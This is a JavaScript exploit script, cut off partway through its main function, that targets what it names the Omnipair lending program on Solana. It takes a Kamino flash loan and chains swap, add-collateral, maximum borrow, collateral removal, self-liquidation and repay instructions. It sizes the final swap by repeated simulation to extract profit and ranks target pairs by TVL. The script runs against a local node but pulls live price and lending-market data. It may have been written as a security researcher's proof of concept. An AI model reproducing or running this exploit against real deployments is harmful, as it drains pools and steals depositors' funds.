import * as anchor from "@coral-xyz/anchor";
import {
  AddressLookupTableProgram,
  ComputeBudgetProgram,
  Connection,
  Keypair,
  PublicKey,
  SYSVAR_INSTRUCTIONS_PUBKEY,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  AccountLayout,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import BN from "bn.js";
import idl from "../target/idl/omnipair.json" with { type: "json" };

const RPC_URL = process.env.RPC_URL || "http://127.0.0.1:8898";
const WS_URL = process.env.WS_URL || "ws://127.0.0.1:8901";
const PROGRAM_ID = new PublicKey("omnixgS8fnqHfCcTGKWj6JtKjzpJZ1Y5y9pyFkQDkYE");
const USDC = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const U64_MAX = new BN("18446744073709551615");
const TOP_N = Number(process.env.TOP_N || "18");
const REPEATS = Number(process.env.REPEATS || "4");
const PRE_SWAP_PPM = BigInt(process.env.PRE_SWAP_PPM || "700000");
const COLLATERAL_PPM = BigInt(process.env.COLLATERAL_PPM || "3400000");
const BPS = 10_000n;
const MIN_PROFIT_USD = Number(process.env.MIN_PROFIT_USD || "1");
const PREVIEW_BOTH_SIDES = process.env.PREVIEW_BOTH_SIDES !== "0";
const FORCE_SIDE = process.env.FORCE_SIDE || "";
const TARGET_PAIR = process.env.TARGET_PAIR || "";
const TRACE_LOGS = process.env.TRACE_LOGS === "1";
const KAMINO_MARKET_FILTER = process.env.KAMINO_MARKET_FILTER || "";
const KAMINO_PROGRAM_ID = new PublicKey("KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD");
const KAMINO_MARKETS_URL = "https://api.kamino.finance/v2/kamino-market";
const KAMINO_RESERVE_DISCRIMINATOR = Buffer.from([43, 242, 204, 202, 26, 247, 59, 127]);
const KAMINO_FLASH_BORROW_DISCRIMINATOR = Buffer.from([135, 231, 52, 167, 7, 52, 212, 193]);
const KAMINO_FLASH_REPAY_DISCRIMINATOR = Buffer.from([185, 117, 0, 203, 96, 245, 180, 186]);
const KAMINO_SCALED_FRACTION_ONE = 1n << 60n;

function pda(seeds) {
  return PublicKey.findProgramAddressSync(seeds, PROGRAM_ID)[0];
}

function kaminoPda(seeds) {
  return PublicKey.findProgramAddressSync(seeds, KAMINO_PROGRAM_ID)[0];
}

function u64Le(value) {
  const buffer = Buffer.alloc(8);
  buffer.writeBigUInt64LE(BigInt(value.toString()));
  return buffer;
}

function bi(value) {
  return BigInt(value.toString());
}

function rawToUi(raw, decimals) {
  return Number(raw) / 10 ** decimals;
}

function usdValue(raw, decimals, price) {
  return rawToUi(raw, decimals) * price;
}

function ceilDiv(a, b) {
  return (a + b - 1n) / b;
}

function rawToUiString(raw, decimals, digits = 6) {
  const scale = 10n ** BigInt(decimals);
  const whole = raw / scale;
  const fraction = raw % scale;
  if (digits <= 0) return whole.toString();
  const padded = fraction.toString().padStart(decimals, "0").slice(0, digits);
  return `${whole}.${padded.padEnd(digits, "0")}`;
}

function readPubkey(data, offset) {
  return new PublicKey(data.subarray(offset, offset + 32));
}

function scaledFractionToBpsCeil(value) {
  const scaled = BigInt(value.toString());
  if (scaled === 18_446_744_073_709_551_615n) return 0n;
  return ceilDiv(scaled * BPS, KAMINO_SCALED_FRACTION_ONE);
}

function decodeKaminoReserve(data) {
  if (!data.subarray(0, 8).equals(KAMINO_RESERVE_DISCRIMINATOR)) {
    throw new Error("invalid kamino reserve discriminator");
  }
  const liquidityOffset = 128;
  const configOffset = 4856;
  return {
    mint: readPubkey(data, liquidityOffset),
    supplyVault: readPubkey(data, liquidityOffset + 32),
    feeVault: readPubkey(data, liquidityOffset + 64),
    availableRaw: data.readBigUInt64LE(liquidityOffset + 96),
    mintDecimals: Number(data.readBigUInt64LE(liquidityOffset + 144)),
    tokenProgram: readPubkey(data, liquidityOffset + 280),
    flashLoanFeeSf: data.readBigUInt64LE(configOffset + 48),
  };
}

async function fetchJson(url) {
  const response = await fetch(url);
  if (!response.ok) throw new Error(`${url} returned ${response.status}`);
  return response.json();
}

function recordVenueLiquidity(map, mint, entry) {
  if (entry.availableRaw <= 0n) return;
  const existing = map.get(mint) || [];
  existing.push(entry);
  existing.sort((a, b) => (a.availableRaw === b.availableRaw ? 0 : a.availableRaw > b.availableRaw ? -1 : 1));
  map.set(mint, existing);
}

async function loadKaminoLiquidity(connection, decimalsByMint) {
  const liquidity = new Map();
  const markets = await fetchJson(KAMINO_MARKETS_URL);
  const rows = [];
  for (const market of markets) {
    const metricsUrl = `https://api.kamino.finance/kamino-market/${market.lendingMarket}/reserves/metrics`;
    let metrics;
    try {
      metrics = await fetchJson(metricsUrl);
    } catch (err) {
      console.error("venue_market_error", "kamino", market.name, err?.message || err);
      continue;
    }
    for (const reserve of metrics) {
      const mint = reserve.liquidityTokenMint;
      const decimals = decimalsByMint.get(mint);
      if (decimals == null) continue;
      if (!reserve.reserve || !market.lendingMarket) continue;
      rows.push({
        market: market.lendingMarket,
        marketName: market.name,
        reserve: reserve.reserve,
        token: reserve.liquidityToken,
        mint,
      });
    }
  }

  for (let i = 0; i < rows.length; i += 100) {
    const chunk = rows.slice(i, i + 100);
    const infos = await connection.getMultipleAccountsInfo(
      chunk.map((row) => new PublicKey(row.reserve)),
      "confirmed",
    );
    for (let j = 0; j < chunk.length; j++) {
      const row = chunk[j];
      const info = infos[j];
      if (!info || !info.owner.equals(KAMINO_PROGRAM_ID)) continue;
      let decoded;
      try {
        decoded = decodeKaminoReserve(info.data);
      } catch (err) {
        console.error("venue_reserve_decode_error", "kamino", row.reserve, err?.message || err);
        continue;
      }
      const mint = decoded.mint.toBase58();
      const decimals = decimalsByMint.get(mint);
      if (decimals == null || decoded.mintDecimals !== decimals) continue;
      recordVenueLiquidity(liquidity, mint, {
        venue: "kamino",
        programId: KAMINO_PROGRAM_ID.toBase58(),
        market: row.market,
        reserve: row.reserve,
        token: mint,
        liquiditySupply: decoded.supplyVault.toBase58(),
        feeReceiver: decoded.feeVault.toBase58(),
        tokenProgram: decoded.tokenProgram.toBase58(),
        availableRaw: decoded.availableRaw,
        feeBps: scaledFractionToBpsCeil(decoded.flashLoanFeeSf),
        marketName: row.marketName,
      });
    }
  }
  return liquidity;
}

function selectFlashVenue(liquidityByMint, mint, requiredRaw) {
  const candidates = (liquidityByMint.get(mint) || []).filter((entry) => (
    entry.availableRaw >= requiredRaw &&
    entry.reserve &&
    entry.market &&
    entry.liquiditySupply &&
    entry.feeReceiver &&
    (!KAMINO_MARKET_FILTER || entry.marketName === KAMINO_MARKET_FILTER)
  ));
  candidates.sort((a, b) => {
    if (a.feeBps !== b.feeBps) return a.feeBps < b.feeBps ? -1 : 1;
    if (a.availableRaw === b.availableRaw) return 0;
    return a.availableRaw > b.availableRaw ? -1 : 1;
  });
  return candidates[0] || null;
}

function kaminoFlashBorrowReserveLiquidityIx(flashVenue, amount, destinationLiquidity, userTransferAuthority, tokenProgram) {
  const lendingMarket = new PublicKey(flashVenue.market);
  const lendingMarketAuthority = kaminoPda([Buffer.from("lma"), lendingMarket.toBuffer()]);
  const programId = new PublicKey(flashVenue.programId || KAMINO_PROGRAM_ID);
  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: userTransferAuthority, isSigner: true, isWritable: false },
      { pubkey: lendingMarketAuthority, isSigner: false, isWritable: false },
      { pubkey: lendingMarket, isSigner: false, isWritable: false },
      { pubkey: new PublicKey(flashVenue.reserve), isSigner: false, isWritable: true },
      { pubkey: new PublicKey(flashVenue.token), isSigner: false, isWritable: false },
      { pubkey: new PublicKey(flashVenue.liquiditySupply), isSigner: false, isWritable: true },
      { pubkey: destinationLiquidity, isSigner: false, isWritable: true },
      { pubkey: new PublicKey(flashVenue.feeReceiver), isSigner: false, isWritable: true },
      { pubkey: programId, isSigner: false, isWritable: false },
      { pubkey: programId, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_INSTRUCTIONS_PUBKEY, isSigner: false, isWritable: false },
      { pubkey: tokenProgram, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([KAMINO_FLASH_BORROW_DISCRIMINATOR, u64Le(amount)]),
  });
}

function kaminoFlashRepayReserveLiquidityIx(flashVenue, amount, borrowInstructionIndex, sourceLiquidity, userTransferAuthority, tokenProgram) {
  const lendingMarket = new PublicKey(flashVenue.market);
  const lendingMarketAuthority = kaminoPda([Buffer.from("lma"), lendingMarket.toBuffer()]);
  const programId = new PublicKey(flashVenue.programId || KAMINO_PROGRAM_ID);
  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: userTransferAuthority, isSigner: true, isWritable: false },
      { pubkey: lendingMarketAuthority, isSigner: false, isWritable: false },
      { pubkey: lendingMarket, isSigner: false, isWritable: false },
      { pubkey: new PublicKey(flashVenue.reserve), isSigner: false, isWritable: true },
      { pubkey: new PublicKey(flashVenue.token), isSigner: false, isWritable: false },
      { pubkey: new PublicKey(flashVenue.liquiditySupply), isSigner: false, isWritable: true },
      { pubkey: sourceLiquidity, isSigner: false, isWritable: true },
      { pubkey: new PublicKey(flashVenue.feeReceiver), isSigner: false, isWritable: true },
      { pubkey: programId, isSigner: false, isWritable: false },
      { pubkey: programId, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_INSTRUCTIONS_PUBKEY, isSigner: false, isWritable: false },
      { pubkey: tokenProgram, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([KAMINO_FLASH_REPAY_DISCRIMINATOR, u64Le(amount), Buffer.from([borrowInstructionIndex])]),
  });
}

function sidePrincipal(pair, collateralIsToken0) {
  const collateralReserve = collateralIsToken0 ? pair.reserve0 : pair.reserve1;
  const preSwapAmount = (collateralReserve * PRE_SWAP_PPM) / 1_000_000n;
  const collateralAmount = (collateralReserve * COLLATERAL_PPM) / 1_000_000n;
  return { preSwapAmount, collateralAmount, principal: preSwapAmount + collateralAmount };
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitForSignature(connection, signature, label, timeoutMs = 120_000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const status = await connection.getSignatureStatuses([signature], { searchTransactionHistory: true });
    const value = status.value[0];
    if (value?.err) throw new Error(`${label} failed: ${JSON.stringify(value.err)}`);
    if (value?.confirmationStatus === "confirmed" || value?.confirmationStatus === "finalized") return;
    await sleep(500);
  }
  throw new Error(`${label} not confirmed after ${timeoutMs}ms: ${signature}`);
}

async function waitForTransaction(connection, signature, timeoutMs = 120_000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const info = await connection.getTransaction(signature, {
      commitment: "confirmed",
      maxSupportedTransactionVersion: 0,
    });
    if (info) return info;
    await sleep(500);
  }
  throw new Error(`transaction not available after ${timeoutMs}ms: ${signature}`);
}

async function ensureAta(connection, payer, owner, mint, tokenProgram = TOKEN_PROGRAM_ID) {
  const ata = getAssociatedTokenAddressSync(mint, owner, false, tokenProgram, ASSOCIATED_TOKEN_PROGRAM_ID);
  if (await connection.getAccountInfo(ata)) return ata;
  const tx = new Transaction().add(
    createAssociatedTokenAccountInstruction(
      payer.publicKey,
      ata,
      owner,
      mint,
      tokenProgram,
      ASSOCIATED_TOKEN_PROGRAM_ID,
    ),
  );
  await sendAndConfirmTransaction(connection, tx, [payer], { commitment: "confirmed" });
  return ata;
}

async function tokenRaw(connection, account) {
  const balance = await connection.getTokenAccountBalance(account);
  return BigInt(balance.value.amount);
}

async function mintOwner(connection, mint) {
  const info = await connection.getAccountInfo(mint);
  if (!info) throw new Error(`missing mint ${mint.toBase58()}`);
  if (info.owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
  return TOKEN_PROGRAM_ID;
}

async function fetchJupiterPrices(mints) {
  const prices = new Map([[USDC, 1]]);
  for (let i = 0; i < mints.length; i += 50) {
    const chunk = mints.slice(i, i + 50);
    const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${chunk.join(",")}`);
    if (!response.ok) continue;
    const body = await response.json();
    for (const mint of chunk) {
      const entry = body[mint];
      const price = entry?.usdPrice ?? entry?.price ?? entry?.usd;
      if (price != null && Number.isFinite(Number(price)) && Number(price) > 0) {
        prices.set(mint, Number(price));
      }
    }
  }
  return prices;
}

async function tokenSymbol(mint) {
  if (mint === USDC) return "USDC";
  try {
    const response = await fetch(`https://lite-api.jup.ag/tokens/v2/search?query=${mint}`);
    if (!response.ok) return mint.slice(0, 4);
    const body = await response.json();
    const exact = body.find((entry) => entry.id === mint) || body[0];
    return exact?.symbol || mint.slice(0, 4);
  } catch {
    return mint.slice(0, 4);
  }
}

function inferInternalPrices(pairs, prices) {
  let changed = true;
  for (let pass = 0; pass < 8 && changed; pass++) {
    changed = false;
    for (const pair of pairs) {
      if (pair.reserve0 <= 0n || pair.reserve1 <= 0n) continue;
      const price0 = prices.get(pair.token0);
      const price1 = prices.get(pair.token1);
      const token1PerToken0 = rawToUi(pair.reserve1, pair.token1Decimals) / rawToUi(pair.reserve0, pair.token0Decimals);
      if (price0 != null && price1 == null && token1PerToken0 > 0) {
        prices.set(pair.token1, price0 / token1PerToken0);
        changed = true;
      } else if (price1 != null && price0 == null && token1PerToken0 > 0) {
        prices.set(pair.token0, price1 * token1PerToken0);
        changed = true;
      }
    }
  }
}

function clonePair(publicKey, account) {
  return {
    pubkey: publicKey.toBase58(),
    token0: account.token0.toBase58(),
    token1: account.token1.toBase58(),
    token0Pk: account.token0,
    token1Pk: account.token1,
    rateModel: account.rateModel,
    reserve0: bi(account.reserve0),
    reserve1: bi(account.reserve1),
    cashReserve0: bi(account.cashReserve0),
    cashReserve1: bi(account.cashReserve1),
    token0Decimals: Number(account.token0Decimals),
    token1Decimals: Number(account.token1Decimals),
  };
}

function pairTvl(pair, prices) {
  const price0 = prices.get(pair.token0);
  const price1 = prices.get(pair.token1);
  if (price0 == null || price1 == null) return null;
  return usdValue(pair.reserve0, pair.token0Decimals, price0) + usdValue(pair.reserve1, pair.token1Decimals, price1);
}

function sideCashUsd(pair, collateralIsToken0, prices) {
  const raw = collateralIsToken0 ? pair.cashReserve0 : pair.cashReserve1;
  const decimals = collateralIsToken0 ? pair.token0Decimals : pair.token1Decimals;
  const price = prices.get(collateralIsToken0 ? pair.token0 : pair.token1);
  return price == null ? 0 : usdValue(raw, decimals, price);
}

function plannedSides(pair, prices) {
  if (pair.token0 === USDC) return [true, false];
  if (pair.token1 === USDC) return [false, true];
  const preferred = sideCashUsd(pair, true, prices) >= sideCashUsd(pair, false, prices);
  return [preferred, !preferred];
}

function sideCandidates(pair, prices, liquidityByMint) {
  const sides = plannedSides(pair, prices);
  const ordered = [...sides];
  for (const side of [true, false]) {
    if (!ordered.includes(side)) ordered.push(side);
  }
  const forced =
    FORCE_SIDE === "token0" || FORCE_SIDE === "0" ? true : FORCE_SIDE === "token1" || FORCE_SIDE === "1" ? false : null;
  return ordered.filter((side) => forced == null || side === forced).map((side) => {
    const { principal } = sidePrincipal(pair, side);
    const mint = side ? pair.token0 : pair.token1;
    const decimals = side ? pair.token0Decimals : pair.token1Decimals;
    const price = side ? pair.price0 : pair.price1;
    const flashVenue = selectFlashVenue(liquidityByMint, mint, principal);
    return {
      side,
      mint,
      decimals,
      principal,
      flashVenue,
      flashloanUsd: usdValue(principal, decimals, price),
    };
  });
}

function parseLeftRight(logs) {
  let left = null;
  let right = null;
  for (const line of logs || []) {
    const leftMatch = line.match(/Program log: Left: (\d+)/);
    const rightMatch = line.match(/Program log: Right: (\d+)/);
    if (leftMatch) left = BigInt(leftMatch[1]);
    if (rightMatch) right = BigInt(rightMatch[1]);
  }
  return { left, right };
}

function logsText(logs) {
  return (logs || []).join("\n");
}

function simulatedTokenAmount(simulationValue, accountIndex) {
  const account = simulationValue.accounts?.[accountIndex];
  if (!account?.data) return null;
  const [data, encoding] = account.data;
  if (encoding !== "base64") return null;
  const decoded = AccountLayout.decode(Buffer.from(data, "base64"));
  return BigInt(decoded.amount.toString());
}

async function buildAttackContext(connection, pair, collateralIsToken0, principal) {
  const attacker = Keypair.generate();
  const sig = await connection.requestAirdrop(attacker.publicKey, 10_000_000_000);
  await waitForSignature(connection, sig, "airdrop");

  const pairPk = new PublicKey(pair.pubkey);
  const collateralMint = collateralIsToken0 ? pair.token0Pk : pair.token1Pk;
  const debtMint = collateralIsToken0 ? pair.token1Pk : pair.token0Pk;
  const collateralTokenProgram = await mintOwner(connection, collateralMint);
  const debtTokenProgram = await mintOwner(connection, debtMint);
  const userCollateral = await ensureAta(connection, attacker, attacker.publicKey, collateralMint, collateralTokenProgram);
  const userDebt = await ensureAta(connection, attacker, attacker.publicKey, debtMint, debtTokenProgram);

  const futarchyAuthority = pda([Buffer.from("futarchy_authority")]);
  const userPosition = pda([Buffer.from("gamm_position"), pairPk.toBuffer(), attacker.publicKey.toBuffer()]);
  const reserve0Vault = pda([Buffer.from("reserve_vault"), pairPk.toBuffer(), pair.token0Pk.toBuffer()]);
  const reserve1Vault = pda([Buffer.from("reserve_vault"), pairPk.toBuffer(), pair.token1Pk.toBuffer()]);
  const collateral0Vault = pda([Buffer.from("collateral_vault"), pairPk.toBuffer(), pair.token0Pk.toBuffer()]);
  const collateral1Vault = pda([Buffer.from("collateral_vault"), pairPk.toBuffer(), pair.token1Pk.toBuffer()]);
  const reserveCollateralVault = collateralIsToken0 ? reserve0Vault : reserve1Vault;
  const reserveDebtVault = collateralIsToken0 ? reserve1Vault : reserve0Vault;
  const collateralVault = collateralIsToken0 ? collateral0Vault : collateral1Vault;

  const [createLookupIx, lookupTableAddress] = AddressLookupTableProgram.createLookupTable({
    authority: attacker.publicKey,
    payer: attacker.publicKey,
    recentSlot: await connection.getSlot("confirmed"),
  });
  const extendLookupIx = AddressLookupTableProgram.extendLookupTable({
    authority: attacker.publicKey,
    payer: attacker.publicKey,
    lookupTable: lookupTableAddress,
    addresses: [
      PROGRAM_ID,
      pairPk,
      pair.rateModel,
      futarchyAuthority,
      userPosition,
      reserve0Vault,
      reserve1Vault,
      collateralVault,
      userCollateral,
      userDebt,
      collateralMint,
      debtMint,
      TOKEN_PROGRAM_ID,
      TOKEN_2022_PROGRAM_ID,
      SystemProgram.programId,
    ],
  });
  const setupTx = new Transaction().add(createLookupIx, extendLookupIx);
  setupTx.feePayer = attacker.publicKey;
  setupTx.recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
  await sendAndConfirmTransaction(connection, setupTx, [attacker], { commitment: "confirmed" });
  const lookupTable = (await connection.getAddressLookupTable(lookupTableAddress)).value;
  if (!lookupTable) throw new Error("lookup table not found");

  return {
    attacker,
    pairPk,
    collateralMint,
    debtMint,
    collateralTokenProgram,
    debtTokenProgram,
    userCollateral,
    userDebt,
    reserveCollateralVault,
    reserveDebtVault,
    collateralVault,
    futarchyAuthority,
    userPosition,
    lookupTable,
  };
}

async function buildAttackTx(connection, program, pair, ctx, preSwapAmount, collateralAmount, finalDebtIn, flashVenue) {
  const common = {
    pair: ctx.pairPk,
    rateModel: pair.rateModel,
    futarchyAuthority: ctx.futarchyAuthority,
    tokenProgram: TOKEN_PROGRAM_ID,
    token2022Program: TOKEN_2022_PROGRAM_ID,
  };
  const swapCollateralToDebtIx = await program.methods
    .swap({ amountIn: new BN(preSwapAmount.toString()), minAmountOut: new BN(0) })
    .accountsPartial({
      ...common,
      tokenInVault: ctx.reserveCollateralVault,
      tokenOutVault: ctx.reserveDebtVault,
      userTokenInAccount: ctx.userCollateral,
      userTokenOutAccount: ctx.userDebt,
      tokenInMint: ctx.collateralMint,
      tokenOutMint: ctx.debtMint,
      user: ctx.attacker.publicKey,
    })
    .instruction();
  const addCollateralIx = await program.methods
    .addCollateral({ amount: new BN(collateralAmount.toString()) })
    .accountsPartial({
      ...common,
      userPosition: ctx.userPosition,
      collateralVault: ctx.collateralVault,
      userCollateralTokenAccount: ctx.userCollateral,
      collateralTokenMint: ctx.collateralMint,
      user: ctx.attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .instruction();
  const borrowIx = await program.methods
    .borrow({ amount: U64_MAX })
    .accountsPartial({
      ...common,
      userPosition: ctx.userPosition,
      reserveVault: ctx.reserveDebtVault,
      userReserveTokenAccount: ctx.userDebt,
      reserveTokenMint: ctx.debtMint,
      user: ctx.attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .instruction();
  const removeCollateralIx = await program.methods
    .removeCollateral({ amount: U64_MAX })
    .accountsPartial({
      ...common,
      userPosition: ctx.userPosition,
      collateralVault: ctx.collateralVault,
      userCollateralTokenAccount: ctx.userCollateral,
      collateralTokenMint: ctx.collateralMint,
      user: ctx.attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .instruction();
  const liquidateIx = await program.methods
    .liquidate()
    .accountsPartial({
      ...common,
      userPosition: ctx.userPosition,
      collateralVault: ctx.collateralVault,
      callerTokenAccount: ctx.userCollateral,
      collateralTokenMint: ctx.collateralMint,
      reserveVault: ctx.reserveCollateralVault,
      positionOwner: ctx.attacker.publicKey,
      payer: ctx.attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .instruction();
  const repayIx = await program.methods
    .repay({ amount: U64_MAX })
    .accountsPartial({
      ...common,
      userPosition: ctx.userPosition,
      reserveVault: ctx.reserveDebtVault,
      userReserveTokenAccount: ctx.userDebt,
      reserveTokenMint: ctx.debtMint,
      user: ctx.attacker.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .instruction();
  const finalSwapIx = await program.methods
    .swap({ amountIn: new BN(finalDebtIn.toString()), minAmountOut: new BN(0) })
    .accountsPartial({
      ...common,
      tokenInVault: ctx.reserveDebtVault,
      tokenOutVault: ctx.reserveCollateralVault,
      userTokenInAccount: ctx.userDebt,
      userTokenOutAccount: ctx.userCollateral,
      tokenInMint: ctx.debtMint,
      tokenOutMint: ctx.collateralMint,
      user: ctx.attacker.publicKey,
    })
    .instruction();

  const flashBorrowIx = kaminoFlashBorrowReserveLiquidityIx(
    flashVenue,
    preSwapAmount + collateralAmount,
    ctx.userCollateral,
    ctx.attacker.publicKey,
    ctx.collateralTokenProgram,
  );
  const flashRepayIx = kaminoFlashRepayReserveLiquidityIx(
    flashVenue,
    preSwapAmount + collateralAmount,
    1,
    ctx.userCollateral,
    ctx.attacker.publicKey,
    ctx.collateralTokenProgram,
  );

  const instructions = [
    ComputeBudgetProgram.setComputeUnitLimit({ units: 1_400_000 }),
    flashBorrowIx,
    swapCollateralToDebtIx,
    addCollateralIx,
    borrowIx,
    removeCollateralIx,
    liquidateIx,
    repayIx,
    removeCollateralIx,
    finalSwapIx,
    flashRepayIx,
  ];
  const message = new TransactionMessage({
    payerKey: ctx.attacker.publicKey,
    recentBlockhash: (await connection.getLatestBlockhash("confirmed")).blockhash,
    instructions,
  }).compileToV0Message([ctx.lookupTable]);
  const tx = new VersionedTransaction(message);
  tx.sign([ctx.attacker]);
  return tx;
}

async function simulateAttack(connection, program, pair, ctx, preSwapAmount, collateralAmount, finalDebtIn, accountAddresses, flashVenue) {
  const tx = await buildAttackTx(connection, program, pair, ctx, preSwapAmount, collateralAmount, finalDebtIn, flashVenue);
  const result = await connection.simulateTransaction(tx, {
    commitment: "confirmed",
    sigVerify: false,
    accounts:
      accountAddresses.length > 0
        ? { encoding: "base64", addresses: accountAddresses.map((address) => address.toBase58()) }
        : undefined,
  });
  return result.value;
}

async function findFinalDebtIn(connection, program, pair, ctx, preSwapAmount, collateralAmount, flashVenue) {
  const high = await simulateAttack(
    connection,
    program,
    pair,
    ctx,
    preSwapAmount,
    collateralAmount,
    18_446_744_073_709_551_615n,
    [],
    flashVenue,
  );
  const highLogs = logsText(high.logs);
  if (!high.err) return 18_446_744_073_709_551_615n;
  if (!highLogs.includes("InsufficientBalance")) {
    throw new Error(`initial probe failed before final swap: ${JSON.stringify(high.err)} ${highLogs.slice(-800)}`);
  }
  const balance = parseLeftRight(high.logs).left;
  if (balance == null || balance <= 2_000n) throw new Error("could not parse final debt-token balance");
  let finalDebtIn = balance - 1_000n;

  for (let i = 0; i < 14; i++) {
    const probe = await simulateAttack(connection, program, pair, ctx, preSwapAmount, collateralAmount, finalDebtIn, [], flashVenue);
    if (!probe.err) return finalDebtIn;
    const text = logsText(probe.logs);
    const { left, right } = parseLeftRight(probe.logs);
    if (text.includes("InsufficientCashReserve") && left != null && right != null && right > 0n) {
      finalDebtIn = (finalDebtIn * left * 970n) / (right * 1000n);
      if (finalDebtIn <= 1_000n) break;
      continue;
    }
    if (text.includes("InsufficientBalance") && left != null && left > 2_000n) {
      finalDebtIn = left - 1_000n;
      continue;
    }
    throw new Error(`final sizing failed: ${JSON.stringify(probe.err)} ${text.slice(-800)}`);
  }

  const conservative = (finalDebtIn * 850n) / 1000n;
  const probe = await simulateAttack(connection, program, pair, ctx, preSwapAmount, collateralAmount, conservative, [], flashVenue);
  if (!probe.err) return conservative;
  throw new Error(`no successful final swap size: ${JSON.stringify(probe.err)} ${logsText(probe.logs).slice(-800)}`);
}

async function executeAttack(connection, program, pair, collateralIsToken0, symbols, { commit = true, ctx = null, flashVenue } = {}) {
  const collateralDecimals = collateralIsToken0 ? pair.token0Decimals : pair.token1Decimals;
  const collateralPrice = collateralIsToken0 ? pair.price0 : pair.price1;
  const { preSwapAmount, collateralAmount, principal } = sidePrincipal(pair, collateralIsToken0);
  ctx ||= await buildAttackContext(connection, pair, collateralIsToken0, principal);
  const beforeCollateral = await tokenRaw(connection, ctx.userCollateral);
  let finalDebtIn = await findFinalDebtIn(connection, program, pair, ctx, preSwapAmount, collateralAmount, flashVenue);
  let finalSimulation = null;
  for (let i = 0; i < 8; i++) {
    finalSimulation = await simulateAttack(connection, program, pair, ctx, preSwapAmount, collateralAmount, finalDebtIn, [
      ctx.userCollateral,
      ctx.userDebt,
    ], flashVenue);
    if (!finalSimulation.err) break;
    const text = logsText(finalSimulation.logs);
    const { left, right } = parseLeftRight(finalSimulation.logs);
    if (text.includes("InsufficientCashReserve") && left != null && right != null && right > 0n) {
      finalDebtIn = (finalDebtIn * left * 950n) / (right * 1000n);
      continue;
    }
    if (text.includes("InsufficientBalance") && left != null && left > 2_000n) {
      finalDebtIn = left - 1_000n;
      continue;
    }
    throw new Error(`final simulation failed after sizing: ${JSON.stringify(finalSimulation.err)} ${text.slice(-800)}`);
  }
  if (finalSimulation?.err) {
    throw new Error(`final simulation failed after reducer: ${JSON.stringify(finalSimulation.err)}`);
  }
  if (TRACE_LOGS) {
    console.log("trace_logs_begin");
    for (const line of finalSimulation.logs || []) console.log(line);
    console.log("trace_logs_end");
  }
  const simulatedAfterCollateral = simulatedTokenAmount(finalSimulation, 0);
  const simulatedAfterDebt = simulatedTokenAmount(finalSimulation, 1);
  if (simulatedAfterCollateral == null) throw new Error("missing simulated collateral account");
  const simulatedProfitRaw = simulatedAfterCollateral - beforeCollateral;
  const simulatedProfitUsd = usdValue(simulatedProfitRaw, collateralDecimals, collateralPrice);

  if (!commit) {
    return {
      committed: false,
      collateralIsToken0,
      collateralSymbol: collateralIsToken0 ? symbols.token0 : symbols.token1,
      debtSymbol: collateralIsToken0 ? symbols.token1 : symbols.token0,
      preSwapAmount,
      collateralAmount,
      principal,
      finalDebtIn,
      flashVenue,
      profitRaw: simulatedProfitRaw,
      profitUsd: simulatedProfitUsd,
      afterCollateral: simulatedAfterCollateral,
      afterDebt: simulatedAfterDebt || 0n,
      slot: null,
      cu: finalSimulation.unitsConsumed,
      ctx,
    };
  }

  const tx = await buildAttackTx(connection, program, pair, ctx, preSwapAmount, collateralAmount, finalDebtIn, flashVenue);
  const sig = await connection.sendTransaction(tx, { skipPreflight: false, maxRetries: 0 });
  await waitForSignature(connection, sig, "attack transaction");
  const info = await waitForTransaction(connection, sig);
  const afterCollateral = await tokenRaw(connection, ctx.userCollateral);
  const afterDebt = await tokenRaw(connection, ctx.userDebt);
  const profitRaw = afterCollateral - beforeCollateral;
  const profitUsd = usdValue(profitRaw, collateralDecimals, collateralPrice);
  return {
    committed: true,
    collateralIsToken0,
    collateralSymbol: collateralIsToken0 ? symbols.token0 : symbols.token1,
    debtSymbol: collateralIsToken0 ? symbols.token1 : symbols.token0,
    preSwapAmount,
    collateralAmount,
    principal,
    finalDebtIn,
    flashVenue,
    profitRaw,
    profitUsd,
    afterCollateral,
    afterDebt,
    signature: sig,
    slot: info?.slot,
    cu: info?.meta?.computeUnitsConsumed,
    ctx,
  };
}

async function main() {
  const connection = new Connection(RPC_URL, { commitment: "confirmed", wsEndpoint: WS_URL });
  const provider = new anchor.AnchorProvider(connection, { publicKey: PublicKey.default }, { commitment: "confirmed" });
  const program = new anchor.Program(idl, provider);
  const slot = await connection.getSlot("confirmed");
  const accounts = await program.account.pair.all();
  const pairs = accounts.map(({ publicKey, account }) => clonePair(publicKey, account));
  const decimalsByMint = new Map();
  for (const pair of pairs) {
    decimalsByMint.set(pair.token0, pair.token0Decimals);
    decimalsByMint.set(pair.token1, pair.token1Decimals);
  }
  const mints = [...new Set(pairs.flatMap((pair) => [pair.token0, pair.token1]))];
  const prices = await fetchJupiterPrices(mints);
  inferInternalPrices(pairs, prices);

  const pricedPairs = pairs
    .map((pair) => {
      const price0 = prices.get(pair.token0);
      const price1 = prices.get(pair.token1);
      if (price0 == null || price1 == null) return null;
      return {
        ...pair,
        price0,
        price1,
        tvlUsd: pairTvl(pair, prices),
      };
    })
    .filter(Boolean)
    .filter((pair) => !TARGET_PAIR || pair.pubkey === TARGET_PAIR)
    .sort((a, b) => b.tvlUsd - a.tvlUsd)
